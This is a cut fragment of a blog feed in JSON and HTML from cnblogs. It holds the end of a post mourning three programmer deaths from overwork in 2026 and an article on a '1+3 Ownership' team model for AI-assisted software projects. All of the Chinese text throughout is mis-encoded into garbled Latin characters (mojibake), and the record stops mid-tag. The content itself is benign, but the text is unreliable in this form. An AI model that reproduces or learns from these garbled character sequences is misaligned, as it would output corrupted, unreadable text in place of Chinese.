class=\"md-plain\">æ˜¯å•Šï¼Œæˆ‘ä»¬åŠªåŠ›å·¥ä½œï¼Œæ˜¯ä¸ºäº†æ›´å¥½çš„ç”Ÿæ´»ï¼Œè€Œä¸æ˜¯ä¸ºäº†æ¯æ‰ç”Ÿæ´»ï¼›æˆ‘ä»¬æ‹¼å‘½èµšé’±ï¼Œæ˜¯ä¸ºäº†å®ˆæŠ¤å®¶äººï¼Œè€Œä¸æ˜¯ä¸ºäº†è®©å®¶äººæ‰¿å—å¤±å»æˆ‘ä»¬çš„ç—›è‹¦ã€‚</span></h4>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">2026å¼€å¹´çš„è¿™ä¸‰èµ·æ‚²å‰§ï¼Œä»æ¥éƒ½ä¸æ˜¯å¶ç„¶ï¼Œä¹Ÿä¸ä»…ä»…æ˜¯ç¨‹åºå‘˜è¿™ä¸ªè¡Œä¸šçš„å›°å¢ƒï¼Œå®ƒæ˜¯æ— æ•°å½“ä»£æ™®é€šäººçš„ç¼©å½±â€”â€”æˆ‘ä»¬è¢«ç”Ÿæ´»è£¹æŒŸï¼Œè¢«å‹åŠ›è¿½èµ¶ï¼Œä¸æ•¢åœï¼Œä¸æ•¢æ­‡ï¼Œå´åœ¨ä¸çŸ¥ä¸è§‰ä¸­ï¼Œé€æ”¯ç€è‡ªå·±çš„å¥åº·ï¼Œæ¶ˆè€—ç€è‡ªå·±çš„ç”Ÿå‘½ã€‚è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç”Ÿæ´»ï¼Œä¹Ÿä¸æ˜¯æˆ‘ä»¬æ‹¼å‘½åŠªåŠ›çš„æ„ä¹‰ã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">ä»Šå¤©ï¼Œæˆ‘ä¸æƒ³èŠèŒåœºå†…å·ï¼Œä¸æƒ³è°ˆKPIï¼Œä¹Ÿä¸æƒ³æŒ‡è´£è°çš„è¿‡é”™ï¼Œæˆ‘åªæƒ³å€Ÿç€è¿™ä¸‰èµ·ä»¤äººå¿ƒç¢çš„æ‚²å‰§ï¼Œè·Ÿæ¯ä¸€ä¸ªåœ¨ç”Ÿæ´»é‡Œå¥‹åŠ›å¥”è·‘çš„æ™®é€šäººï¼Œè¯´ä¸€å¥å¿ƒé‡Œè¯ï¼šè¯·åœä¸‹ä½ åŒ†åŒ†çš„è„šæ­¥ï¼Œå¥½å¥½ç…§é¡¾è‡ªå·±çš„èº«ä½“ï¼›è¯·åˆ«å†é€æ”¯å¥åº·ï¼Œåˆ«å†æ‹¿ç”Ÿå‘½èµŒæ˜å¤©ã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">ä½ å¯ä»¥åŠªåŠ›ï¼Œä½†è¯·ä¸è¦æ‹¼å‘½ï¼›ä½ å¯ä»¥ä¸Šè¿›ï¼Œä½†è¯·è®°å¾—åŠ³é€¸ç»“åˆã€‚ç´¯äº†ï¼Œå°±æ­‡ä¸€æ­‡ï¼Œå¥½å¥½ç¡ä¸€è§‰ï¼›é¥¿äº†ï¼Œå°±å¥½å¥½åƒä¸€é¡¿é¥­ï¼›åˆ«æ€»æŠŠâ€œå¿™â€â€œæ²¡æ—¶é—´â€æŒ‚åœ¨å˜´è¾¹ï¼Œåˆ«æ€»æŠŠå®¶äººçš„ç‰µæŒ‚æŠ›åœ¨è„‘åï¼Œåˆ«ç­‰èº«ä½“å‘å‡ºäº†å¼ºçƒˆçš„é¢„è­¦ï¼Œåˆ«ç­‰æ„å¤–å‘ç”Ÿï¼Œæ‰åæ‚”è«åŠã€‚</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">è¿™ä¸–é—´ï¼Œæ²¡æœ‰ä»€ä¹ˆæ¯”ç”Ÿå‘½æ›´çè´µï¼Œæ²¡æœ‰ä»€ä¹ˆæ¯”å¥åº·æ›´é‡è¦ã€‚æ„¿è¿™ä¸‰èµ·æ‚²å‰§ï¼Œèƒ½ç»™æ¯ä¸€ä¸ªæ™®é€šäººæ•²å“è­¦é’Ÿï¼›æ„¿æ¯ä¸€ä¸ªåŠªåŠ›ç”Ÿæ´»çš„äººï¼Œéƒ½èƒ½å®ˆä½è‡ªå·±çš„å¥åº·ï¼Œå®ˆä½è‡ªå·±çš„å®¶äººï¼›æ„¿æˆ‘ä»¬éƒ½èƒ½æ˜ç™½ï¼Œå¥½å¥½æ´»ç€ï¼Œå°±æ˜¯å¯¹ç”Ÿæ´»æœ€å¥½çš„çƒ­çˆ±ï¼Œå°±æ˜¯å¯¹å®¶äººæœ€å¥½çš„å®ˆæŠ¤ã€‚</span></p>\n<p class=\"md-end-block md-p md-focus\"><span class=\"md-plain md-expand\">åç»­ï¼Œæˆ‘è¿˜ä¼šç»§ç»­å’Œå¤§å®¶èŠèŠè¿™ä¸‰èµ·äº‹ä»¶èƒŒåæ›´æ·±å±‚çš„æ€è€ƒï¼ŒèŠèŠæˆ‘ä»¬æ™®é€šäººè¯¥å¦‚ä½•åœ¨å‹åŠ›ä¹‹ä¸‹ï¼Œå®ˆä½å¥åº·ã€å®ˆä½åº•çº¿ã€‚ä¹Ÿæ¬¢è¿å¤§å®¶åœ¨è¯„è®ºåŒºç»§ç»­ç•™è¨€ï¼Œè¯´è¯´ä½ çš„æ•…äº‹ï¼Œè°ˆè°ˆä½ çš„æ„Ÿæ‚Ÿï¼Œæ„¿æˆ‘ä»¬éƒ½èƒ½åœ¨å½¼æ­¤çš„è¯‰è¯´é‡Œï¼Œæ‰¾åˆ°åŠ›é‡ï¼Œå¥½å¥½ç”Ÿæ´»ï¼Œå¹³å®‰é¡ºé‚ã€‚</span></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-30 19:11</span>&nbsp;\n<a href=\"https://www.cnblogs.com/philry\">AIå¤§èŠ’æœ2ç‚¹0</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">151</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "AIæ—¶ä»£çš„é¡¹ç›®ç®¡ç†ï¼š1+3Ownershipæ¨¡å¼å’Œé¡¹ç›®ç®¡ç†",
      "link": "https://www.cnblogs.com/zer0Black/p/19555418",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/zer0Black/p/19555418\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-30 18:30\">\n    <span>AIæ—¶ä»£çš„é¡¹ç›®ç®¡ç†ï¼š1+3Ownershipæ¨¡å¼å’Œé¡¹ç›®ç®¡ç†</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"é¡¹ç›®ç®¡ç†-aiå¼€å‘-å›¢é˜Ÿåä½œ\">é¡¹ç›®ç®¡ç† #AIå¼€å‘ #å›¢é˜Ÿåä½œ</h1>\n<p>é’ˆå¯¹ä¸­å¤§å‹äº¤ä»˜å‹é¡¹ç›®ï¼ŒAIæ—¶ä»£ä»£ç æå…¶å»‰ä»·ï¼Œä»€ä¹ˆæ ·çš„å¼€å‘æ¨¡å¼èƒ½é€‚é…é¡¹ç›®äº¤ä»˜å›¢é˜Ÿï¼Ÿå¦‚ä½•å‡å°‘å›¢é˜Ÿé—´é¢‘ç¹æ²Ÿé€šæ‹‰é«˜çš„æˆæœ¬ï¼Ÿ1+3 Ownershipæ¡†æ¶æ‹†è§£ã€Œè¶…çº§ä¸ªä½“ã€ï¼Œè®©æ™®é€šå›¢é˜Ÿä¹Ÿèƒ½å®ç°AIåŸç”Ÿå¼€å‘ã€‚</p>\n<p>æœ¬æ–‡æ€è·¯ä¸»è¦æ ¹æ®ç‘å…¸é©¬å·¥å‘æ˜çš„tri-ownershipæ¨¡å‹è¿›è¡Œäº†é€‚åˆå…¬å¸çš„é€‚é…åŒ–æ”¹è¿›ï¼Œå‘½åä¸ºï¼š<code>1+3Ownershipæ¨¡å¼</code>ï¼Œç»†åŒ–é˜è¿°äº†æ„å»ºè§’è‰²ã€é‡‡ç”¨æµç¨‹ã€ç»„ç»‡è°ƒæ•´æ–¹å¼ã€‚åç»­ä¼šå®Œå–„æŠ€æˆ˜æœ¯ç›¸å…³æ–‡æ¡£</p>\n<h2 id=\"ä¸€æ¡†æ¶æ¦‚è¿°\">ä¸€ã€æ¡†æ¶æ¦‚è¿°</h2>\n<p>å€Ÿé‰´å»ºç­‘è¡Œä¸šè§’è‰²åˆ†å·¥ï¼Œ1+3 Ownershipæ¡†æ¶å°†ã€Œå¤´ç‹¼/è¶…çº§ä¸ªä½“ã€çš„ç«¯åˆ°ç«¯å·¥ä½œæ‹†åˆ†ä¸ºä¸‰ä¸ªè§’è‰²ï¼šProduct Ownerã€Tech Ownerã€Quality Ownerã€‚ç”±é¡¹ç›®ç»ç†ç»Ÿä¸€è§„åˆ’ï¼ŒåŒæ—¶ç®¡ç†å¤šä¸ªä¸‰äººç»„æ‰§è¡Œã€‚</p>\n<p>è¿™ä¸ªæ¡†æ¶çš„æ ¸å¿ƒä»·å€¼æ˜¯ä»€ä¹ˆï¼Ÿ<strong>æä¾›å¯å¤åˆ¶çš„åä½œæ¨¡å¼</strong>ï¼Œè®©æ™®é€šå›¢é˜Ÿä¹Ÿèƒ½å®ç°AIåŸç”Ÿå¼€å‘ã€‚</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<h2 id=\"äºŒè§’è‰²èŒè´£\">äºŒã€è§’è‰²èŒè´£</h2>\n<h3 id=\"é¡¹ç›®ç»ç†æ€»å·¥ç¨‹å¸ˆ\">é¡¹ç›®ç»ç†ï¼ˆæ€»å·¥ç¨‹å¸ˆï¼‰</h3>\n<p>æ ¸å¿ƒèŒè´£æ¸…æ™°æ˜äº†ï¼š</p>\n<ul>\n<li>æ§åˆ¶é¢„ç®—ï¼Œç®¡é’±</li>\n<li>æ‹†è§£æ¨¡å—åˆ†åˆ°ä¸‰äººç»„ï¼Œç®¡äº‹</li>\n<li>ç»´æŠ¤ç‰ˆæœ¬èŠ‚å¥å’Œè®¡åˆ’ï¼Œç®¡æ—¶</li>\n<li>å®‰æ’å·¥æœŸï¼Œç®¡è¿›åº¦</li>\n<li>æ¨¡å—é—´è¡”æ¥ååŒå®‰æ’ï¼Œç®¡åè°ƒ</li>\n</ul>\n<p>é¡¹ç›®ç»ç†å°±åƒæ€»å·¥ç¨‹å¸ˆï¼Œç»Ÿç­¹å…¨å±€ä½†ä¸æ’æ‰‹å…·ä½“æ–½å·¥ã€‚</p>\n<h3 id=\"ä¸‰äººç»„åˆ†å·¥\">ä¸‰äººç»„åˆ†å·¥</h3>\n<h4 id=\"product-owneräº§å“è´Ÿè´£äººpo\">Product Ownerï¼ˆäº§å“è´Ÿè´£äººï¼ŒPOï¼‰</h4>\n<p><strong>å¯¹åº”è§’è‰²</strong>ï¼šå»ºç­‘è®¾è®¡å¸ˆ</p>\n<p><strong>æ ¸å¿ƒèŒè´£</strong>ï¼š</p>\n<ul>\n<li>å®šä¹‰äº§å“/é¡¹ç›®æ„¿æ™¯å’Œå•†ä¸šä»·å€¼</li>\n<li>ç®¡ç†ç”¨æˆ·æ•…äº‹ã€éªŒæ”¶æ ‡å‡†å’Œä¼˜å…ˆçº§</li>\n<li>å¯¹äº§å‡ºä»·å€¼è´Ÿè´£</li>\n<li>è¾“å‡ºPRDã€åŸå‹ç›¸å…³äº§å‡ºï¼ˆå¹¶ç»„ç»‡éœ€æ±‚è¯„å®¡ï¼‰</li>\n</ul>\n<p><strong>å…³é”®ç‚¹</strong>ï¼šPOå¯¹<strong>äº§å‡ºçš„ä»·å€¼è´Ÿè´£</strong>ï¼Œè€Œä¸æ˜¯å¯¹äº§å‡ºæœ¬èº«è´Ÿè´£ã€‚POä¸æ˜¯å†™éœ€æ±‚æ–‡æ¡£çš„ç§˜ä¹¦ï¼Œè€Œæ˜¯å†³å®š\"ä»€ä¹ˆå€¼å¾—åš\"çš„äººã€‚</p>\n<p><strong>äº§å‡ºæµç¨‹</strong>ï¼š</p>\n<pre><code>åŠŸèƒ½åˆ—è¡¨ â†’ ä¸šåŠ¡æµç¨‹å›¾ â†’ PRDï¼ˆæŒ‰æ¨¡å—äº§å‡ºï¼‰â†’ åŸå‹ï¼ˆè¿­ä»£ï¼Œæœ€ç»ˆæˆå“ï¼‰ â†’ è®¾è®¡å›¾ï¼ˆUI/UEå·¥ç¨‹å¸ˆï¼‰â†’ ç”¨æˆ·æ‰‹å†Œ\n</code></pre>\n<p>ä¸¾ä¸ªä¾‹å­ï¼ŒPOå°±åƒå»ºç­‘è®¾è®¡å¸ˆï¼Œå†³å®šè¿™æ ‹æ¥¼ç”¨æ¥åšä»€ä¹ˆï¼ˆä½å®…ï¼Ÿå•†åœºï¼Ÿï¼‰ï¼Œè€Œä¸æ˜¯è´Ÿè´£ç Œç –ã€‚</p>\n<h4 id=\"tech-owneræŠ€æœ¯è´Ÿè´£äººto\">Tech Ownerï¼ˆæŠ€æœ¯è´Ÿè´£äººï¼ŒTOï¼‰</h4>\n<p><strong>å¯¹åº”è§’è‰²</strong>ï¼šå»ºç­‘å·¥ç¨‹å¸ˆ</p>\n<p><strong>æ ¸å¿ƒèŒè´£</strong>ï¼š</p>\n<ul>\n<li>æ‹†å­æ¨¡å—ï¼Œæ‹†åŠŸèƒ½ç‚¹</li>\n<li>æ¶æ„è®¾è®¡å’Œè¯¦ç»†è®¾è®¡</li>\n<li>ä»£ç reviewæŠ¥å‘Šå’Œå·¥å…·é€‰å‹</li>\n<li>ç¡®è®¤ç»†èŠ‚ï¼Œå¸¦é¢†Agentç¼–å†™ä»£ç </li>\n<li>éƒ¨ç½²å·¥ä½œ</li>\n</ul>\n<p><strong>äº§å‡ºæµç¨‹</strong>ï¼š</p>\n<pre><code>è·å–PRD â†’ è¯¦ç»†è®¾è®¡ï¼ˆä»£ç è®¾è®¡å’Œæ•°æ®åº“è®¾è®¡ï¼‰ â†’ TDDæµ‹è¯•ç”¨ä¾‹\n</code></pre>\n<p>TOå°±åƒå»ºç­‘å·¥ç¨‹å¸ˆï¼Œæ ¹æ®è®¾è®¡å¸ˆçš„å›¾çº¸ç¡®å®šæ€ä¹ˆæ–½å·¥ï¼Œç”¨ä»€ä¹ˆææ–™ï¼Œæ€ä¹ˆç Œè¿™é¢å¢™ã€‚</p>\n<h4 id=\"quality-ownerè´¨é‡è´Ÿè´£äººqo\">Quality Ownerï¼ˆè´¨é‡è´Ÿè´£äººï¼ŒQOï¼‰</h4>\n<p><strong>å¯¹åº”è§’è‰²</strong>ï¼šç›‘ç†</p>\n<p><strong>æ ¸å¿ƒèŒè´£</strong>ï¼š</p>\n<ul>\n<li>å…¨æµç¨‹è´¨é‡æ§åˆ¶</li>\n<li>è®¾è®¡è´¨é‡æµç¨‹</li>\n<li>è®¾è®¡å¤šå±‚æ¬¡æµ‹è¯•ä½“ç³»ï¼ˆå•å…ƒæµ‹è¯• â†’ é›†æˆæµ‹è¯• â†’ ç«¯åˆ°ç«¯æµ‹è¯•ï¼‰</li>\n<li>å¯¹æŠ—å¼æµ‹è¯•</li>\n</ul>\n<p><strong>äº§å‡ºæµç¨‹</strong>ï¼š</p>\n<ul>\n<li><strong>åŠŸèƒ½</strong>ï¼šæµ‹è¯•ç”¨ä¾‹ â†’ æµ‹è¯•è¿‡ç¨‹ï¼ˆäºº+AIï¼‰ â†’ Bug â†’ æµ‹è¯•æŠ¥å‘Š</li>\n<li><strong>æ€§èƒ½</strong>ï¼šæµ‹è¯•æ–¹æ¡ˆ â†’ æµ‹è¯•è¿‡ç¨‹ï¼ˆäºº+AIï¼‰ â†’ æµ‹è¯•æŠ¥å‘Š</li>\n<li><strong>å®‰å…¨</strong>ï¼šæµ‹è¯•æ–¹æ¡ˆ â†’ æµ‹è¯•è¿‡ç¨‹ï¼ˆäºº+AIï¼‰ â†’ æµ‹è¯•æŠ¥å‘Š</li>\n</ul>\n<p>QOå°±åƒç›‘ç†ï¼Œå…¨ç¨‹ç›¯ç€æ–½å·¥è´¨é‡ï¼Œå‘ç°é—®é¢˜ç«‹é©¬å«åœæ•´æ”¹ã€‚</p>\n<h2 id=\"ä¸‰ai-agentçš„è§’è‰²\">ä¸‰ã€AI Agentçš„è§’è‰²</h2>\n<p><strong>å¯¹åº”è§’è‰²</strong>ï¼šæ–½å·¥æ–¹</p>\n<p><strong>èŒè´£</strong>ï¼š</p>\n<ul>\n<li>æŒ‰æŒ‡ä»¤å†™ä»£ç ã€è·‘æµ‹è¯•ã€ç”Ÿæˆæ–‡æ¡£</li>\n<li>ä¸é…æœ‰ç½²åæƒ</li>\n</ul>\n<p><strong>å…³é”®ç‚¹</strong>ï¼šAI Agentæ‰¿æ‹…æœ€ç¹é‡çš„ç¼–ç ä»»åŠ¡ï¼Œä½†å¿…é¡»åœ¨ä¸‰Ownerçš„ç¼–æ’å’Œç›‘ç£ä¸‹å·¥ä½œã€‚</p>\n<p>AI Agentå°±åƒæ–½å·¥é˜Ÿï¼ŒæŒ‰å›¾çº¸å¹²æ´»ï¼Œæ•ˆç‡é«˜ä½†éœ€è¦æœ‰äººæŒ‡æŒ¥ã€‚</p>\n<h2 id=\"å››æ¡†æ¶ä¼˜åŠ¿\">å››ã€æ¡†æ¶ä¼˜åŠ¿</h2>\n<h3 id=\"å¯å¤åˆ¶æ€§\">å¯å¤åˆ¶æ€§</h3>\n<p>ä¸ä¾èµ–ã€Œè¶…çº§ä¸ªä½“/å¤´ç‹¼ã€è¿™æ ·å‡¤æ¯›éºŸè§’çš„äººæ‰ï¼Œä¸‰ä¸ªè§’è‰²éƒ½æ˜¯å¯åŸ¹å…»çš„ä¸“ä¸šæŠ€èƒ½ã€‚</p>\n<p>ä¸ºä»€ä¹ˆè¿™å¾ˆé‡è¦ï¼Ÿå› ä¸ºè¶…çº§ä¸ªä½“å¤ªéš¾æ‰¾äº†ï¼Œè€ŒåŸ¹å…»ä¸‰ä¸ªä¸“ä¸šäººæ‰ç›¸å¯¹å®¹æ˜“ã€‚</p>\n<h3 id=\"è´¨é‡ä¿éšœ\">è´¨é‡ä¿éšœ</h3>\n<p>é€šè¿‡å…¨æµç¨‹æµ‹è¯•ä½“ç³»å’Œç‹¬ç«‹QOï¼Œå°†è´¨é‡å·¥ä½œåˆ†æ•£åˆ°æ•´ä¸ªç”Ÿå‘½å‘¨æœŸï¼Œè€Œä¸æ˜¯é›†ä¸­åœ¨æœ€åéªŒæ”¶ã€‚</p>\n<p>ä»¥å‰æ˜¯ä»€ä¹ˆæƒ…å†µï¼Ÿæœ€åæµ‹è¯•å‘ç°ä¸€å †Bugï¼Œå…¨å›¢é˜Ÿä¸€èµ·åŠ ç­æ”¹ã€‚ç°åœ¨æ˜¯ä»€ä¹ˆæƒ…å†µï¼Ÿå…¨ç¨‹è´¨é‡æ§åˆ¶ï¼Œé—®é¢˜æ—©å‘ç°æ—©è§£å†³ã€‚</p>\n<h3 id=\"å¼€å‘æ•ˆç‡\">å¼€å‘æ•ˆç‡</h3>\n<p>ä¸‰ä¸ªOwnerå¯ä»¥å¹¶å‘å·¥ä½œï¼ŒAI Agentæ‰¿æ‹…ç¹é‡ç¼–ç ä»»åŠ¡ï¼Œç†è®ºä¸Šæ¯å¤©èƒ½å®Œæˆ2~3ä¸ªä¸šåŠ¡åŠŸèƒ½ç‚¹ã€‚</p>\n<pre><code>åŠŸèƒ½ç‚¹å®šä¹‰ä¸ºä¸€ä¸ªå®Œæ•´çš„ã€ç”¨æˆ·å¯æ„ŸçŸ¥çš„ä¸šåŠ¡ä»·å€¼å•å…ƒï¼Œå¦‚ï¼š\n1. å¢åˆ æ”¹æŸ¥ç­‰æ•°æ®ç»´æŠ¤åŠŸèƒ½\n2. å¤æ‚æŠ¥è¡¨ç”Ÿæˆ\n3. ç™»å½•åŠŸèƒ½ç­‰å¯è¿è¡Œçš„åŠŸèƒ½\n</code></pre>\n<h2 id=\"äº”å›¢é˜Ÿç»„ç»‡æ–¹å¼\">äº”ã€å›¢é˜Ÿç»„ç»‡æ–¹å¼</h2>\n<h3 id=\"å¿…é¡»åªèƒ½æ˜¯4ä¸ªäººå—\">å¿…é¡»åªèƒ½æ˜¯4ä¸ªäººå—ï¼Ÿ</h3>\n<p>åœ¨ä¸€ä¸ªå›¢é˜Ÿé‡Œï¼Œä¿æŒ1+3çš„æ¨¡å¼ï¼Œä½†é’ˆå¯¹ä¸åŒçš„æ¨¡å—ï¼Œå¯ä»¥æ˜¯ä¸åŒçš„ä¸‰äººç»„ã€‚</p>\n<p>åŒä¸€äººå¯ä»¥ç©¿æ’åœ¨ä¸åŒçš„ä¸‰äººç»„é‡Œã€‚</p>\n<p>ä¸¾ä¸ªä¾‹å­ï¼Œæ€»è®¡A/B/C/Då››ä¸ªæ¨¡å—ï¼š</p>\n<ul>\n<li>Açš„ä¸‰äººç»„ï¼šå¼ ä¸‰ï¼ˆPOï¼‰ã€æå››ï¼ˆTOï¼‰ã€ç‹äº”ï¼ˆQOï¼‰</li>\n<li>Bçš„ä¸‰äººç»„ï¼šå¼ ä¸‰ï¼ˆPOï¼‰ã€èµµå…­ï¼ˆTOï¼‰ã€ç‹äº”ï¼ˆQOï¼‰</li>\n<li>Cçš„ä¸‰äººç»„ï¼šå¼ ä¸‰ï¼ˆPOï¼‰ã€èµµå…­ï¼ˆTOï¼‰ã€å‘¨å…«ï¼ˆQOï¼‰</li>\n<li>Dçš„ä¸‰äººç»„ï¼šå¼ ä¸‰ï¼ˆPOï¼‰ã€å­™ä¸ƒï¼ˆTOï¼‰ã€å‘¨å…«ï¼ˆQOï¼‰</li>\n</ul>\n<p>ä¸ºä»€ä¹ˆè¦è¿™æ ·è®¾è®¡ï¼Ÿçµæ´»è°ƒé…èµ„æºï¼Œé¿å…æœ‰äººé—²ç½®æœ‰äººå¿™æ­»ã€‚</p>\n<h2 id=\"å…­å®Œæ•´å·¥ä½œæµç¨‹\">å…­ã€å®Œæ•´å·¥ä½œæµç¨‹</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>å…·ä½“æŠ€æˆ˜æ³•ï¼Œç›¸å…³æ‰§è¡Œå·¥å…·è®¾è®¡æ€è·¯åç»­ä¼šæ•´ç†å•ç‹¬çš„æ–‡æ¡£ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p>\n<h2 id=\"ä¸ƒç»„ç»‡æ¶æ„è°ƒæ•´\">ä¸ƒã€ç»„ç»‡æ¶æ„è°ƒæ•´</h2>\n<h3 id=\"ä¼ ç»Ÿæ¶æ„é—®é¢˜\">ä¼ ç»Ÿæ¶æ„é—®é¢˜</h3>\n<p>ä¼ ç»Ÿçš„ç»„ç»‡æ¶æ„åŒ…å«å¦‚ä¸‹è§’è‰²ï¼š</p>\n<ol>\n<li>é¡¹ç›®ç»ç†</li>\n<li>æŠ€æœ¯ç»ç†</li>\n<li>æ¶æ„å¸ˆ</li>\n<li>éœ€æ±‚åˆ†æå¸ˆï¼ˆäº§å“ç»ç†ï¼‰</li>\n<li>UI/UEè®¾è®¡å¸ˆ</li>\n<li>å‰ç«¯å·¥ç¨‹å¸ˆ</li>\n<li>åç«¯å·¥ç¨‹å¸ˆ</li>\n<li>ç®—æ³•å·¥ç¨‹å¸ˆ</li>\n<li>æµ‹è¯•å·¥ç¨‹å¸ˆ</li>\n<li>è¿ç»´å·¥ç¨‹å¸ˆ</li>\n</ol>\n<p>è¿™ä¹ˆå¤šè§’è‰²ï¼Œæ²Ÿé€šæˆæœ¬é«˜ä¸é«˜ï¼Ÿé«˜ï¼è€Œä¸”å¾ˆå¤šè§’è‰²åœ¨AIæ—¶ä»£å¯ä»¥åˆå¹¶ã€‚</p>\n<h3 id=\"ai-nativeæ¶æ„ä¼˜åŒ–\">AI Nativeæ¶æ„ä¼˜åŒ–</h3>\n<p>AI Nativeå›¢é˜Ÿè°ƒæ•´åç»“æœå¦‚ä¸‹ï¼š</p>\n<ol>\n<li>é¡¹ç›®ç»ç†ï¼ˆæ‡‚æŠ€æœ¯ï¼ŒæŠ€æœ¯å‡ºèº«ï¼‰</li>\n<li>æ¶æ„å¸ˆï¼ˆè¶…å¤§è§„æ¨¡é¡¹ç›®éœ€è¦ï¼Œå¦åˆ™æŠ€æœ¯è´Ÿè´£äººå…¼ä»»ï¼‰</li>\n<li>UI/UEè®¾è®¡å¸ˆ</li>\n<li>äº§å“è´£ä»»äºº</li>\n<li>æŠ€æœ¯è´£ä»»äººï¼ˆåŸå…ˆçš„å‰ç«¯/åç«¯å·¥ç¨‹å¸ˆï¼Œä¸ç»†åˆ†å²—ä½ï¼‰</li>\n<li>è´¨é‡è´£ä»»äºº</li>\n</ol>\n<p>ä»10ä¸ªè§’è‰²ç²¾ç®€åˆ°6ä¸ªï¼Œæ²Ÿé€šé“¾æ¡ç¼©çŸ­ï¼Œæ•ˆç‡è‡ªç„¶æå‡ã€‚</p>\n<h2 id=\"å…«æµç¨‹è°ƒæ•´\">å…«ã€æµç¨‹è°ƒæ•´</h2>\n<h3 id=\"ç®¡ç†æµç¨‹é‡æ„\">ç®¡ç†æµç¨‹é‡æ„</h3>\n<p>æ¯å¤©äº§å‡ºä»£ç æ¿€å¢ï¼Œäº§å‡ºåŠŸèƒ½æ¿€å¢ã€‚ç®¡ç†æµç¨‹åˆ°åº•æ€ä¹ˆæ”¹æ‰ä¸ä¼šé˜»å¡ä¸‰äººç»„çš„é«˜æ•ˆè¿è½¬ï¼Ÿ</p>\n<p>ä¼ ç»Ÿçš„é¡¹ç›®ç®¡ç†æœ‰å„ç§è¯„å®¡ã€ç«™ä¼šã€çœ‹æ¿ç³»ç»Ÿã€ç›¸äº’Code Reviewã€CI/CDç­‰ç§ç§ä¸ºäº†æ§åˆ¶è¿›åº¦å’Œè´¨é‡äº§ç”Ÿçš„ç®¡ç†æªæ–½ã€‚åœ¨AIæ—¶ä»£ï¼Œå“ªäº›è¿˜è¦ç»§ç»­æ‰§è¡Œï¼Œå“ªäº›è¦è¢«æ—¶ä»£æŠ›å¼ƒï¼Ÿ</p>\n<p>è¿™ä¸ªé—®é¢˜éœ€è¦æ ¹æ®é¡¹ç›®å®é™…æƒ…å†µæ¥å®šï¼Œä½†æ ¸å¿ƒåŸåˆ™æ˜¯ï¼š<strong>å‡å°‘å½¢å¼ä¸»ä¹‰ï¼Œä¿ç•™ä»·å€¼åˆ›é€ </strong>ã€‚</p>\n<h2 id=\"ä¹åº”ç”¨åœºæ™¯\">ä¹ã€åº”ç”¨åœºæ™¯</h2>\n<h3 id=\"é€‚åˆä½¿ç”¨çš„åœºæ™¯\">é€‚åˆä½¿ç”¨çš„åœºæ™¯</h3>\n<ul>\n<li>ä¸­å¤§å‹é¡¹ç›®</li>\n<li>æ—¢æœ‰å›¢é˜Ÿç¬¦åˆ</li>\n<li>æœ‰AI Nativeå›¢é˜Ÿè½¬å‹è¿°æ±‚</li>\n</ul>\n<h3 id=\"ä¸é€‚ç”¨åœºæ™¯\">ä¸é€‚ç”¨åœºæ™¯</h3>\n<ul>\n<li>é¡¹ç›®è§„æ¨¡æå°ï¼Œè¯·åˆ‡æ¢å¤´ç‹¼æ¨¡å¼ä¸€ä¸ªäººæå®š</li>\n<li>æ²¡æœ‰AIå›¢é˜Ÿè½¬å‹éœ€æ±‚</li>\n</ul>\n<h2 id=\"åä¸€æ€»ç»“\">åä¸€ã€æ€»ç»“</h2>\n<p>1+3 Ownershipæ¡†æ¶æä¾›äº†ä¸€ä¸ªç³»ç»Ÿæ€§çš„åä½œæ¨¡å¼ï¼Œå°†\"ä¸å¯èƒ½çš„è¶…çº§ä¸ªä½“\"æ‹†åˆ†ä¸º\"ä¸‰ä¸ªå¯åŸ¹å…»çš„ä¸“ä¸šè§’è‰²\"ï¼Œè®©æ™®é€šå›¢é˜Ÿä¹Ÿèƒ½å®ç°AIåŸç”Ÿå¼€å‘ã€‚</p>\n<p><strong>æ¡†æ¶çš„æ ¸å¿ƒæ˜¯</strong>ï¼šæ˜ç¡®åˆ†å·¥ã€å…¨æµç¨‹è´¨é‡æ§åˆ¶ã€AI Agentæ‰¿æ‹…ç¹é‡ä»»åŠ¡ã€‚</p>\n<p>è¿™æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿå¯å¤åˆ¶ã€å¯æ‰©å±•ã€å¯æ‰§è¡Œã€‚ä¸å†æ˜¯ä¾èµ–æŸä¸ªå¤©æ‰çš„è‰ºæœ¯ï¼Œè€Œæ˜¯å¯ä»¥æ ‡å‡†åŒ–çš„å·¥ç¨‹ã€‚</p>\n<p>è·Ÿç€æ—¶ä»£ä¸€èµ·ï¼Œå¼€å¯AI Nativeå›¢é˜Ÿè½¬å‹ä¹‹æ—…å§ï¼</p>\n<h2 id=\"åäºŒå‚è€ƒ\">åäºŒã€å‚è€ƒ</h2>\n<p>ä¸»è¦å¼•ç”¨ï¼š<br />\n<a href=\"https://mp.weixin.qq.com/s/Rya4a-nQqFVL5VFPZ1cotQ\" rel=\"noopener nofollow\" target=\"_blank\"># å­¦ä¹ PingCAPï¼Œæ‰“é€ ä½ å…¬å¸çš„AIåŸç”Ÿè½¯ä»¶å¼€å‘å›¢é˜Ÿ</a></p>\n<p>å…¶ä»–è¾…åŠ©å‚è€ƒï¼š<br />\n<a href=\"https://mp.weixin.qq.com/s/8kY6grrMrunTzmz1Oq5MSg\" 